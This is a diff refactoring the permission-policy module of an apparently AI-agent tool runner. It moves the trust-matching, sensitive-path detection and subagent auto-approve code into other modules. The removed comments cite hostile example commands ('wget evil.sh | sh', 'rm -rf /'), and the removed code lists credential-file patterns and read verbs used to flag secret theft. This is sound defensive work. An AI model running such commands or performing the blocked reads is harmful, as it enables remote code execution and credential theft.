@@ -10,212 +10,39 @@ import type {
 } from '../types/permission.js';
 import type { Tool } from '../types/tool.js';
 import { atomicWrite } from '../utils/atomic-write.js';
-import { matchAny, matchAnyCommand, matchGlob } from '../utils/glob-match.js';
+import { matchGlob } from '../utils/glob-match.js';
 import { LruCache } from '../utils/lru-cache.js';
 import { safeParse } from '../utils/safe-json.js';
 import { subjectForToolInput } from '../utils/tool-subject.js';
-import { getDangerousCapabilities, hasCapability, ToolCapabilities } from './capabilities.js';
+import { hasCapability, ToolCapabilities } from './capabilities.js';
 import { type TrustPolicyDiagnostic, validateTrustPolicy } from './permission-policy-schema.js';
 import { getInputString, isClearlyDestructiveBashCommand } from './yolo-risk.js';
 
-/**
- * Match a computed subject against stored trust patterns.
- *
- * Exact string equality is checked FIRST, before glob compilation. Subjects are
- * glob-escaped at the source (`escapeGlobSubject` turns `* ? [ ]` into `\* \? \[
- * \]`), and a stored "always"-trust pattern is just a prior subject — so for an
- * identical command the pattern and the subject are byte-for-byte equal. The
- * glob matcher alone could not confirm that: `compileGlob` does not treat a
- * backslash as an escape outside character classes, so an escaped `\[`/`\]` is
- * parsed as a character-class delimiter and a command like `[ -f x ]` or
- * `grep "[0-9]"` never re-matched its own trust entry — re-prompting forever
- * even after the user chose "always" (#15). Exact equality is also strictly
- * tighter than a glob, so this never widens what a pattern authorizes; genuine
- * wildcard patterns (e.g. a user-authored `git *`) still fall through to glob.
- */
-function matchesTrust(patterns: string[], subject: string): boolean {
-  return patterns.includes(subject) || matchAny(patterns, subject);
-}
+// ── Re-exports from extracted modules ────────────────────────────────────
+export { AutoApprovePermissionPolicy } from './auto-approve-policy.js';
+export {
+  alwaysAllowUnavailableReason,
+  matchesTrust,
+  matchesCommandTrust,
+  hasShellSubject,
+  permissionFingerprint,
+  shellCommandLineFromInput,
+  inputPathLooksSensitive,
+  shellCommandReadsSensitivePath,
+} from './permission-helpers.js';
 
-/**
- * Match a trust pattern against a shell command line, for ALLOW decisions only
- * (WS-047).
- *
- * `matchesTrust` compiles `*` to `[^/]*`, which crosses `;`, `&` and `|`. On a
- * path that is right; on a command it means a user who wrote `git *` also
- * authorized `git status; wget evil.sh | sh`. `matchAnyCommand` stops the
- * wildcard at shell separators, so the pattern authorizes what it appears to.
- *
- * DELIBERATELY NOT used for deny. This matcher is strictly narrower, and
- * narrowing a deny pattern un-blocks whatever falls outside it: a deny of
- * `git *` must keep matching `git status; rm -rf /`, because the user's intent
- * there is "no git-shaped command gets through", not "only well-formed ones".
- * Narrower is safer for allow and more dangerous for deny — hence two call
- * sites with two matchers rather than one shared helper that picks.
- *
- * Exact equality is kept first for the same reason as `matchesTrust`: a stored
- * "always" pattern is a prior subject, and glob-escaped brackets do not
- * round-trip through the compiler (#15).
- */
-function matchesCommandTrust(patterns: string[], subject: string): boolean {
-  return patterns.includes(subject) || matchAnyCommand(patterns, subject);
-}
+// ── Internal imports from extracted modules ──────────────────────────────
+import {
+  matchesTrust,
+  matchesCommandTrust,
+  hasShellSubject,
+  alwaysAllowUnavailableReason,
+  permissionFingerprint,
+  shellCommandLineFromInput,
+  inputPathLooksSensitive,
+  shellCommandReadsSensitivePath,
+} from './permission-helpers.js';
 
-/**
- * True when this tool's permission subject is a shell command line rather than
- * a path, url, or name — i.e. when the stricter wildcard rules apply.
- */
-function hasShellSubject(tool: Tool): boolean {
-  return (
-    tool.name === 'bash' ||
-    tool.name === 'shell' ||
-    tool.name === 'exec' ||
-    hasCapability(tool, [
-      ToolCapabilities.SHELL_ARBITRARY,
-      ToolCapabilities.SHELL_RESTRICTED,
-      ToolCapabilities.SHELL_EXEC,
-    ])
-  );
-}
-
-/**
- * Reason a persistent "always allow" cannot be recorded for this call, or
- * `undefined` when it can (WS-046).
- *
- * A stored trust pattern is only ever consulted as
- * `entry.allow && subject && matchesTrust(entry.allow, subject)`. When the tool
- * produces no subject, that condition can never be true — so `trust()` with the
- * fallback `pattern: tool.name` writes an entry that is dead on arrival.
- *
- * The user experience of that bug is the damaging part. They pick "always
- * allow", are asked again on the very next identical call, conclude the feature
- * is broken, and reach for the one thing that does work: a blanket
- * `{"exec": {"auto": true}}`. A silent no-op does not just fail to help — it
- * actively trains people into the widest possible grant.
- *
- * So the option is refused with a stated reason instead of accepted and
- * discarded. Exported so a UI can hide the choice rather than offer one that
- * cannot be honoured.
- */
-export function alwaysAllowUnavailableReason(tool: Tool, input: unknown): string | undefined {
-  const subject = subjectForToolInput(tool.name, input, tool.subjectKey);
-  if (subject !== undefined) return undefined;
-  return (
-    `"always allow" needs a subject to remember, and ${tool.name} calls do not carry one ` +
-    `(no subjectKey, and no path/url/name input). Recording it would store a rule that can ` +
-    `never match. Approve this call, or set a trust rule for ${tool.name} explicitly.`
-  );
-}
-
-/**
- * Fingerprint of the tool fields a permission decision actually depends on
- * (WS-058).
- *
- * The eval cache was keyed on tool NAME plus subject, so a cached verdict
- * outlived the tool definition it was computed from. `ToolRegistry.wrap()`
- * replaces a tool in place and is reachable from the plugin API, so a tool
- * tightened to `permission: 'deny'` mid-session would keep being served the
- * `auto` decided under its previous definition. The cache check also runs
- * BEFORE the tool-default-deny branch, so nothing downstream re-checked.
- *
- * Including these fields in the key means a redefined tool misses the cache
- * and is re-evaluated, rather than inheriting a verdict that no longer
- * describes it. Capabilities are included because the dangerous-capability
- * branches read them; they are short, sorted lists. The tuple is
- * JSON-serialized so separators inside a field value (e.g. a `,` or `|`
- * in a capability string) cannot collide with the delimiters between
- * fields.
- */
-function permissionFingerprint(tool: Tool): string {
-  const caps = [...(tool.capabilities ?? [])].sort();
-  return JSON.stringify([
-    tool.permission ?? '',
-    tool.riskTier ?? '',
-    tool.mutating ? 'm' : '',
-    caps,
-  ]);
-}
-
-function shellCommandLineFromInput(input: unknown): string | undefined {
-  const command =
-    getInputString(input, 'command') ??
-    getInputString(input, 'cmd') ??
-    getInputString(input, 'script');
-  if (!command) return undefined;
-  if (!input || typeof input !== 'object') return command;
-  const args = (input as Record<string, unknown>)['args'];
-  if (!Array.isArray(args) || args.length === 0) return command;
-  const renderedArgs = args
-    .filter((arg): arg is string => typeof arg === 'string')
-    .map((arg) => (/\s/.test(arg) ? `"${arg.replace(/"/g, '\\"')}"` : arg));
-  return [command, ...renderedArgs].join(' ');
-}
-
-const SENSITIVE_READ_PATHS: RegExp[] = [
-  /(?:^|[\\/])\.env(?:[.\w-]*)?$/i,
-  /(?:^|[\\/])\.npmrc$/i,
-  /(?:^|[\\/])\.pypirc$/i,
-  /(?:^|[\\/])\.netrc$/i,
-  /(?:^|[\\/])id_(?:rsa|dsa|ecdsa|ed25519)$/i,
-  /(?:^|[\\/])\.aws[\\/]credentials$/i,
-  /(?:^|[\\/])\.kube[\\/]config$/i,
-  /(?:^|[\\/])(?:secrets?|tokens?|credentials?|private[_-]?keys?)$/i,
-  /(?:^|[\\/])[^\\/]*(?:secret|token|credential|private[_-]?key)[^\\/]*(?:\.json|\.ya?ml|\.toml|\.ini|\.txt|\.env|\.properties|\.key|\.pem)$/i,
-];
-
-const SHELL_READ_VERBS = new Set([
-  'cat',
-  'type',
-  'get-content',
-  'gc',
-  'more',
-  'less',
-  'head',
-  'tail',
-  'grep',
-  'rg',
-  'sed',
-  'awk',
-  'findstr',
-  'select-string',
-  'strings',
-  'cp',
-  'copy',
-  'scp',
-]);
-
-function stripShellQuotes(value: string): string {
-  return value.replace(/^['"]|['"]$/g, '');
-}
-
-function pathLooksSensitive(rawPath: string): boolean {
-  const normalized = stripShellQuotes(rawPath).replace(/\\/g, '/');
-  return SENSITIVE_READ_PATHS.some((pattern) => pattern.test(normalized));
-}
-
-function inputPathLooksSensitive(input: unknown): boolean {
-  if (!input || typeof input !== 'object') return false;
-  const obj = input as Record<string, unknown>;
-  for (const key of ['path', 'file', 'file_path', 'filePath', 'target', 'targetPath']) {
-    const value = obj[key];
-    if (typeof value === 'string' && pathLooksSensitive(value)) return true;
-  }
-  return false;
-}
-
-function shellCommandReadsSensitivePath(command: string): boolean {
-  const tokens =
-    command.match(/"[^"]*"|'[^']*'|\S+/g)?.map((token) => stripShellQuotes(token).toLowerCase()) ??
-    [];
-  for (let i = 0; i < tokens.length; i++) {
-    const token = tokens[i];
-    if (!token) continue;
-    if (!SHELL_READ_VERBS.has(token)) continue;
-    const rest = tokens.slice(i + 1);
-    if (rest.some((arg) => pathLooksSensitive(arg))) return true;
-  }
-  return false;
-}
 
 export interface PermissionPolicyOptions {
   trustFile: string;
@@ -1138,123 +965,5 @@ export class DefaultPermissionPolicy implements PermissionPolicy {
       if (matchGlob(pattern, toolName)) return value;
     }
     return undefined;
-  }
-}
-
-/**
- * Auto-approving PermissionPolicy used for subagents. Subagents run
- * non-interactively under a director — they cannot answer permission
- * prompts, so a non-YOLO policy on the leader would silently hang the
- * delegated run on the first sensitive tool call. The user already
- * authorized the delegation when they invoked the leader; subagents
- * inherit that authorization automatically.
- *
- * Tool defaults of `permission: 'deny'` are still honored (this is a
- * subagent capability override, not a deny-bypass).
- *
- * 2026-06+: Primary decision is now based on declared `Tool.capabilities`
- * (capability allowlist / denylist model). The legacy name-based DENY set
- * is kept only for backward compatibility with tools that have not yet
- * declared capabilities.
- *
- * 2026-06-13+: Switched to allowlist-by-default. Only tools with explicitly
- * allowed capabilities are auto-approved. Everything else is denied.
- * Default allowed: fs.read, net.outbound (read-only, safe operations).
- */
-export class AutoApprovePermissionPolicy implements PermissionPolicy {
-  private readonly allowedCapabilities: readonly string[];
-
-  constructor(allowedCapabilities?: readonly string[]) {
-    // Default allowlist: read-only, safe operations
-    this.allowedCapabilities = allowedCapabilities ?? [
-      ToolCapabilities.FS_READ,
-      ToolCapabilities.NET_OUTBOUND,
-    ];
-  }
-
-  private static isMcpTool(name: string): boolean {
-    return name.startsWith('mcp__');
-  }
-
-  async evaluate(tool: Tool): Promise<PermissionDecision> {
-    const caps = tool.capabilities ?? [];
-    const hasAllowedCap = caps.some((c) => this.allowedCapabilities.includes(c));
-    const isMcp = AutoApprovePermissionPolicy.isMcpTool(tool.name);
-    const mcpProxyAllowed = this.allowedCapabilities.includes(ToolCapabilities.MCP_PROXY);
-
-    // A tool may bundle several capabilities (e.g. `install` declares both
-    // `package.install` and `shell.restricted`). The `some()` check above only
-    // confirms the tool has *a* useful allowed capability — it does not stop a
-    // dangerous capability from riding along. Require every DANGEROUS capability
-    // the tool declares to be explicitly present in the allowlist, so widening
-    // the allowlist (e.g. `/techstack` adding `fs.write`) grants exactly that
-    // capability and nothing more. This is what lets the ToolExecutor trust an
-    // `auto` from this policy and skip its post-permission dangerous-capability
-    // downgrade (which would otherwise force a `confirm` no subagent can answer).
-    const dangerousNotAllowed = getDangerousCapabilities(tool).filter(
-      (c) => !this.allowedCapabilities.includes(c),
-    );
-
-    // Block if: tool is an MCP proxy without an explicit mcp.proxy grant,
-    // tool default is deny, no allowed capability, or it carries a dangerous
-    // capability the leader did not explicitly grant.
-    const blocked =
-      tool.permission === 'deny' ||
-      (isMcp && !mcpProxyAllowed) ||
-      !hasAllowedCap ||
-      dangerousNotAllowed.length > 0;
-
-    if (blocked) {
-      const reason =
-        isMcp && !mcpProxyAllowed
-          ? `MCP tool ${tool.name} is not auto-approved for subagents — ask the leader to allow mcp.proxy explicitly`
-          : tool.permission === 'deny'
-            ? 'tool default deny'
-            : dangerousNotAllowed.length > 0
-              ? `tool requires un-granted dangerous capability (needs: ${dangerousNotAllowed.join(', ')}, allowed: ${this.allowedCapabilities.join(', ')})`
-              : `tool lacks allowed capability (has: ${caps.join(', ') || 'none'}, allowed: ${this.allowedCapabilities.join(', ')})`;
-
-      return {
-        permission: 'deny',
-        source: 'subagent_guard',
-        reason,
-      };
-    }
-
-    return { permission: 'auto', source: 'yolo' };
-  }
-  async trust(): Promise<void> {
-    // No-op: subagent permission decisions are ephemeral and must not
-    // pollute the leader's persisted trust file.
-  }
-  async deny(): Promise<void> {
-    // No-op: same as trust — subagent decisions are ephemeral.
-  }
-  denyOnce(): void {
-    // No-op: subagent decisions are ephemeral.
-  }
-  allowOnce(): void {
-    // No-op: subagent decisions are ephemeral.
-  }
-  async explain(tool: Tool): Promise<PermissionTrace> {
-    const decision = await this.evaluate(tool);
-    return {
-      toolName: tool.name,
-      subject: null,
-      steps: [
-        {
-          rule: 'subagent auto',
-          matched: decision.permission === 'auto',
-          decision: decision.permission,
-          source: decision.source,
-          detail: decision.reason ?? `subagent policy: ${decision.permission}`,
-        },
-      ],
-      winnerIndex: 0,
-      decision,
-    };
-  }
-  async reload(): Promise<void> {
-    // No-op: nothing to load.
   }
 }
